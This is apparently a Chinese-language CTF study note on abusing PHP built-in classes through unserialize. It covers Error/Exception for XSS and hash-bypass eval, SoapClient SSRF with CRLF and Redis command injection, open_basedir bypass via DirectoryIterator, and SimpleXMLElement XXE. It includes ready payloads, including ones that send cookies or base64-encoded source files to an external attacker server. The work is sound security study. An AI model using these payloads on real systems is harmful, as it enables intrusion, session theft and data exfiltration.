# php原生类


常遇到的几个 PHP 原生类有如下几个：

- Error
- Exception
- SoapClient
- DirectoryIterator
- SimpleXMLElement

下面我们根据这几个原生类的利用方式分别进行讲解。


## 使用 Error/Exception 内置类进行 XSS

### Error 内置类

- 适用于php7版本
- 在开启报错的情况下
Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 `__toString()` 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 `echo <Object>` 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString` 方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：
```php
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```

//输出: 
`O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D`

### Exception 内置类

- 适用于php5、7版本
- 开启报错的情况下

测试代码：

```php
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

给出POC：
```php
<?php
$a = new Exception("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```
//输出: `O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D`
![[Pasted image 20251202232529.png]]


### [BJDCTF 2nd]xss之光

进入题目，首先通过git泄露拿到源码：

```php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);

仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。

由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：

<?php
$poc = new Exception("<script>window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);</script>");
echo urlencode(serialize($poc));
?>
```

得到payload如下：

```
/?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```
执行后，得到flag就在 cookie 中：![[Pasted image 20251202233052.png]]

## 使用 Error/Exception 内置类绕过哈希比较

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了

### Error 类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

**类摘要：**
```
Error implements Throwable {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```
**类属性：**

- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数

**类方法：**

- [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
- [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
- [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
- [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
- [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
- [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
- [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
- [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
- [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
- [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

### Exception 类

**Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。

**类摘要：**
```
Exception {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```
**类属性：**

- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号

**类方法：**

- [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
- [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
- [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
- [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
- [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
- [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
- [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
- [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
- [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
- [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 `__toString` 方法，这个方法用于将异常或错误对象转换为字符串。


我们以Error为例，我们看看当触发他的 `__toString` 方法时会发生什么：

```php
<?php
$a = new Error("payload",1);
echo $a;

输出如下：

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

发现这将会以字符串的形式输出当前报错，包含当前的错误信息（"payload"）以及当前报错的行号（"2"），而传入 `Error("payload",1)` 中的错误代码“1”则没有输出出来。

在来看看下一个例子：
```php
<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```
```
输出如下：

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

```

可见，`$a` 和 `$b` 这两个错误对象本身是不同的，但是 `__toString` 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 `__toString` 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 `Exception` 类适用于PHP 5和7，而 `Error` 只适用于 PHP 7。

Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。


### [2020 极客大挑战]Greatphp

进入题目，给出源码：
```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```
可见，需要进入eval()执行代码需要先通过上面的if语句：

```
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
```
这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。

这里的考点是md5()和sha1()可以对一个类进行hash，并且会触发这个类的 `__toString` 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 `__toString` 方法。

所以我们可以使用含有 `__toString` 方法的PHP内置类来绕过，用的两个比较多的内置类就是 `Exception` 和 `Error` ，他们之中有一个 `__toString` 方法，当类被当做字符串处理时，就会调用这个函数。

根据刚才讲的Error类和Exception类中 `__toString` 方法的特性，我们可以用这两个内置类进行绕过。

由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 `include "/flag"` 将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。

POC如下：
```php
<?php

class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/* 
或使用[~(取反)][!%FF]的形式，
即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";    

$str = "?><?=include $_GET[_]?>"; 
*/
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>
```

这里 `$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";` 中为什么要在前面加上一个 `?>` 呢？因为 `Exception` 类与 `Error` 的 `__toString` 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：
```
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```
进入eval()函数会类似于：`eval("...Error: <?php payload ?>")`。所以我们要用 `?>` 来闭合一下，即 `eval("...Error: ?><?php payload ?>")`，这样我们的payload便能顺利执行了。

生成的payload如下：
`
`O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A19%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D`
`
执行便可得到flag



## 使用 SoapClient 类进行 SSRF

### SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

类摘要如下：
```
SoapClient {
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = "" ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &$outputHeaders = null ) : mixed
}
```
可以看到，该内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。

该类的构造函数如下：

`public SoapClient :: SoapClient(mixed $wsdl [，array $options ])`

- 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

#### **参数 2：`$options`**

- 类型：`array`
    
- 作用：**控制 SoapClient 的具体行为**
    
- 这里面的字段很多，下面是最重要最常见几个：
    

| 选项               | 作用                                | 是否真实访问          |
| ---------------- | --------------------------------- | --------------- |
| `uri`            | 设置 SOAP XML 里的**命名空间(namespace)** | ❌ 不访问，只是填在请求里   |
| `location`       | SOAP 请求发送的**真正目标 URL**            | ✅ 真实连接（SSRF 关键） |
| `user_agent`     | 自定义 HTTP 请求头 User-Agent           | ✅ 真实生效          |
| `soap_version`   | 选择 SOAP 版本（1.1 / 1.2）             | ✅ 影响发包结构        |
| `login`          | HTTP Basic 认证用户名                  | ✅ 真实发送          |
| `password`       | HTTP Basic 认证密码                   | ✅ 真实发送          |
| `stream_context` | 传入自定义请求上下文（可控制代理/超时等）             | ✅ 真实生效          |
| `trace`          | 记录 SOAP 请求/响应，调试用                 | 本地记录            |
| `exceptions`     | 决定错误是否抛异常                         | 影响本地逻辑          |
| `cache_wsdl`     | 是否缓存 WSDL                         | 如果是 WSDL 模式才有用  |
| `compression`    | 是否启用压缩                            | ✅ 影响 HTTP 传输    |
eg
```php
$options = [
  'uri'      => 'http://example.com',
  'location' => 'http://attacker.com/evil.php'
];
new SoapClient(null, $options);

```

### 使用 SoapClient 类进行 SSRF

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。
```php
<?php
$a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```


但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。

如下测试代码，我们在HTTP头中插入一个cookie：

```php
<?php
$target = 'http://47.xxx.xxx.72:2333/';
$a = new SoapClient(null,array('location' => $target, 'user_agent' => "WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4", 'uri' => 'test'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：
![[Pasted image 20251203002924.png]]
如下测试代码：
```php
<?php
$target = 'http://47.xxx.xxx.72:6379/';
$poc = "CONFIG SET dir /var/www/html";
$a = new SoapClient(null,array('location' => $target, 'uri' => 'hello^^'.$poc.'^^hello'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b); 
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

执行代码后，如下图所示，成功插入了Redis命令：![[Pasted image 20251203002940.png]]

这样我们就可以利用HTTP协议去攻击Redis了。

对于如何发送POST的数据包，这里面还有一个坑，就是 `Content-Type` 的设置，因为我们要提交的是POST数据 `Content-Type` 的值我们要设置为 `application/x-www-form-urlencoded`，这里如何修改 `Content-Type` 的值呢？由于 `Content-Type` 在 `User-Agent` 的下面，所以我们可以通过 `SoapClient` 来设置 `User-Agent` ，将原来的 `Content-Type` 挤下去，从而再插入一个新的 `Content-Type` 。

测试代码如下：

```php
<?php
$target = 'http://47.xxx.xxx.72:2333/';
$post_data = 'data=whoami';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$a = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

执行代码后，如下图所示，成功发送POST数据：

### bestphp's revenge

bestphp's revenge 这道题利用的就是这个点，即对 SoapClient 类进行反序列化触发 SSRF，并配合CRLF构造payload。

进入题目，给出源码：![[Pasted image 20251203003231.png]]

扫描目录发现flag.php：![[Pasted image 20251203003952.png]]

可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。

但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。

写出最后的POC：

```php
<?php
$target = "http://127.0.0.1/flag.php";
$attack = new SoapClient(null,array('location' => $target,
    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
    'uri' => "123"));
$payload = urlencode(serialize($attack));
echo $payload;
```

生成payload：
`
O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`

这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 `PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4` 的session中。

然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有 `ini_set()` 这个函数来更改 `session.serialize_handler` 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET['f'], $_POST);` 函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。

所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：



## 文件操作

**ZipArchive 类删除文件**

> 是不是很神奇, 这个能把文件删除了!

在 `ZipArchive` 中存在 `open` 方法, 参数为 `(string $filename, int $flags=0)`, 第一个为文件名, 第二个为打开的模式, 有以下几种模式
```
ZipArchive::OVERWRITE    总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除
ZipArchive::CREATE        如果不存在则创建一个zip压缩包
ZipArchive::RDONLY        只读模式打开压缩包
ZipArchive::EXCL        如果压缩包已经存在，则出错
ZipArchive::CHECKCONS    对压缩包执行额外的一致性检查，如果失败则显示错误
```

我们可以发现当 `flag` 为 `override` (8) 时, 会将目标文件先进行删除, 之后由于并没有进行保存操作, 于是文件就被删除了

在 `ByteCTF 2019 - EZCMS` 中有出现过

**SQLite3 类创建文件**

可以利用此创建本地数据库的能力来创建一个文件

**DirectoryIterator / FilesystemIterator 列出文件**

这两个类在进行 `toString` 操作后会返回当前目录中的第一个文件

还有一个特殊的 `GlobIterator`, 不需要 `glob://` 就可以遍历目录

**SplFileObject 读取文件**

该方法不支持通配符并且只能获取都爱第一行, 但是当走投无路的时候也不失为一种方法

这几个文件读取类在 2023 第六届安洵杯网络安全挑战赛 - easy_unserialize 出现过, 文末有相关题目

**闭包 (Closure)**

闭包在 PHP 5.3 版本中被引入来代表匿名函数, 直接将其作为函数来调用. 但是会收到 PHP 的安全限制而无法反序列化.

当然, 我们可能会发现一些第三方的 `Closure` 库并没有没安全限制, 利用这些来反序列化也异曲同工.

**Reflection系列 反射**

> 可以参考 PHP 手册: [https://www.php.net/manual/en/book.reflection.php](https://www.php.net/manual/en/book.reflection.php)

反射可以让你获取到指定类,函数等的代码, 可以利用其进行输出

**SimpleXMLElement XML 读取**

可以把这个和 XXE 结合起来实现文件读取

## 使用 DirectoryIterator 类绕过 open_basedir

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。

DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。

测试代码：
```
// test.php
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

### payload一句话的形式:
`$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}`

我们输入 `/?whoami=glob:///*` 即可列出根目录下的文件：



![[Pasted image 20251204101900.png]]
但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

# 使用 SimpleXMLElement 类进行 XXE

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

### SimpleXMLElement

官方文档中对于SimpleXMLElement 类的构造方法 `SimpleXMLElement::__construct` 的定义如下：
![[Pasted image 20251204102521.png]]
![[Pasted image 20251204102526.png]]
可以看到通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。

这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。


首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。

evil.xml：
```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % remote SYSTEM "http://47.xxx.xxx.72/send.xml">
%remote;
%all;
%send;
]>
```
send.xml：
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://47.xxx.xxx.72/send.php?file=%file;'>">
```
send.php：

```
<?php 
file_put_contents("result.txt", $_GET['file']) ;
?>
```
然后在url中构造如下：
```
/show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
```
这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。

如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：

